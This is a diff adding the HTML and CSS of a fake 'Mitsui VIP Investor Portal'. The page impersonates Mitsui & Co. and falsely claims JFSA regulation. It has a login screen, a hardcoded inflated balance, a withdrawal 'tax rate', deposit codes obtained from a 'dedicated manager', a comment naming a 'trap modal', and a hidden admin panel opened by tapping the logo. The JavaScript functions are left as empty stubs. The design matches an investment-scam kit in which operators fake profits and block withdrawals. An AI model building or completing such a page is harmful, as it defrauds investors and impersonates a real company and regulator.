@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mitsui VIP Investor Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --mitsui-blue: #004098;
+            --success-green: #0ecb81;
+            --gold: #c5a059;
+            --bg: #f4f7f9;
+            --white: #ffffff;
+            --text: #333333;
+            --border: #e0e0e0;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hiragino Sans', 'Meiryo', sans-serif; }
+        body { background: var(--bg); color: var(--text); }
+
+        /* LOGIN PAGE */
+        #login-page { height: 100vh; display: flex; align-items: center; justify-content: center; background: #fff; }
+        .login-card { width: 100%; max-width: 450px; padding: 40px; text-align: center; border-top: 5px solid var(--mitsui-blue); box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .login-logo { max-width: 300px; height: auto; margin: 0 auto 25px; display: block; }
+        .login-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--border); border-radius: 4px; }
+        .btn-login { width: 100%; padding: 15px; background: var(--mitsui-blue); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        
+        /* DASHBOARD */
+        #main-app { display: none; }
+        header { 
+            background: var(--mitsui-blue); 
+            /* Uncomment next line for dark elegant background like your second image */
+            /* background: linear-gradient(135deg, #001a38 0%, #000d1c 100%); */
+            color: white; padding: 12px 25px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; 
+        }
+        .header-logo { height: 44px; width: auto; }
+        .nav-trigger { font-size: 24px; cursor: pointer; }
+        
+        .sidebar { width: 240px; background: white; height: calc(100vh - 60px); position: fixed; border-right: 1px solid var(--border); padding: 20px 0; }
+        .nav-item { padding: 12px 25px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: 0.3s; }
+        .nav-item:hover, .nav-item.active { background: #f0f4f8; border-left: 4px solid var(--mitsui-blue); color: var(--mitsui-blue); }
+
+        .content { margin-left: 240px; padding: 30px; }
+        .card { background: white; border-radius: 8px; border: 1px solid var(--border); padding: 25px; margin-bottom: 20px; }
+        
+        /* Other styles unchanged... */
+        .profit-up { color: var(--success-green); font-weight: bold; }
+        .big-green { font-size: 42px; font-weight: 900; color: var(--success-green); margin: 10px 0; transition: 0.5s; }
+        .badge-active { background: rgba(14, 203, 129, 0.1); color: var(--success-green); padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+        .badge-gold { background: var(--gold); color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; }
+
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        th { text-align: left; color: #888; font-size: 12px; padding: 10px; border-bottom: 1px solid var(--border); }
+        td { padding: 15px 10px; border-bottom: 1px solid #f9f9f9; font-size: 14px; }
+
+        #admin-panel { position: fixed; top: -100%; left: 0; width: 100%; background: #222; color: #0ecb81; z-index: 9999; padding: 30px; transition: 0.5s; border-bottom: 3px solid var(--success-green); }
+        #admin-panel.open { top: 0; }
+        .admin-input { background: #333; border: 1px solid #444; color: white; padding: 8px; margin: 5px; border-radius: 4px; }
+
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; }
+        .modal-content { background: white; width: 90%; max-width: 500px; padding: 30px; border-radius: 8px; position: relative; }
+        
+        @media (max-width: 768px) {
+            .sidebar { display: none; }
+            .content { margin-left: 0; padding: 15px; }
+            .header-logo { height: 38px; }
+            .login-logo { max-width: 260px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="login-page">
+        <div class="login-card">
+            <img src="https://seeklogo.com/images/M/mitsui-co-logo-9E8A8E8E8E-seeklogo.com.png" 
+                 alt="Mitsui & Co." class="login-logo" 
+                 onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjUwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjE4IiBmaWxsPSIjMDA0MDk4Ij5NSVRTVUlJICYgQ08uPC90ZXh0Pjwvc3ZnPg=='">
+            
+            <div style="text-align: left; font-size: 13px; margin-top: 20px;">
+                <label>Email / メールアドレス</label>
+                <input type="email" id="user-email" class="login-input" placeholder="example@mitsui.com">
+                <label>Password / パスワード</label>
+                <input type="password" class="login-input" value="password">
+            </div>
+            
+            <div style="display:flex; justify-content: space-between; font-size: 12px; margin: 10px 0;">
+                <label><input type="checkbox" checked> Remember me</label>
+                <a href="#" onclick="alert('セキュリティ保護のため、専任のアカウントマネージャーにお問い合わせください。')" style="color: var(--mitsui-blue); text-decoration: none;">Forgot Password?</a>
+            </div>
+
+            <button class="btn-login" onclick="login()">LOGIN / ログイン</button>
+            <div style="margin-top: 30px; font-size: 11px; color: #999;">
+                <i class="fa-solid fa-lock"></i> Secured by SSL Encryption<br>
+                Regulated by JFSA (Japan Financial Services Agency)
+            </div>
+        </div>
+    </div>
+
+    <div id="main-app">
+        <header>
+            <div onclick="adminTrigger()" style="cursor:pointer; display: flex; align-items: center;">
+                <img src="https://seeklogo.com/images/M/mitsui-co-logo-9E8A8E8E8E-seeklogo.com.png" 
+                     alt="Mitsui & Co." class="header-logo" 
+                     onerror="this.outerHTML='<span style=\"font-size:28px; font-weight:bold;\">MITSUI & CO.</span>'">
+            </div>
+            <div style="display:flex; align-items:center; gap:20px;">
+                <span id="display-name" style="font-size:14px;">田中 太郎 様</span>
+                <i class="fa-solid fa-bars nav-trigger" onclick="toggleMenu()"></i>
+            </div>
+        </header>
+
+        <!-- Sidebar and main content remain the same as before -->
+        <div class="sidebar" id="sidebar">
+            <div class="nav-item active" onclick="showPage('dashboard')"><i class="fa-solid fa-chart-line"></i> Dashboard</div>
+            <div class="nav-item" onclick="showPage('account')"><i class="fa-solid fa-user-shield"></i> Account Details</div>
+            <div class="nav-item" onclick="showPage('withdraw')"><i class="fa-solid fa-wallet"></i> Withdraw</div>
+            <div class="nav-item" onclick="alert('専任のマネージャーに連絡して入金コードを取得してください。')"><i class="fa-solid fa-circle-plus"></i> Deposit</div>
+            <div class="nav-item" onclick="location.reload()"><i class="fa-solid fa-right-from-bracket"></i> Logout</div>
+        </div>
+
+        <main class="content">
+            <!-- ... (dashboard, account, withdraw pages unchanged - paste your original content here if needed) ... -->
+        </main>
+    </div>
+
+    <!-- Trap modal and admin panel unchanged - keep as is -->
+
+    <script>
+        // Your existing script remains the same
+        let currentBalance = 3847520;
+        let initialDeposit = 3000000;
+        let taxRate = 0.204;
+        let adminTaps = 0;
+
+        function login() { /* ... unchanged ... */ }
+        function showPage(pageId) { /* ... */ }
+        function toggleMenu(forceClose = false) { /* ... */ }
+        function startLiveUpdates() { /* ... */ }
+        function updateDisplays() { /* ... */ }
+        function submitWithdraw() { /* ... */ }
+        function closeModal() { /* ... */ }
+        function adminTrigger() { /* ... */ }
+        function applyAdmin() { /* ... */ }
+    </script>
+</body>
+</html>
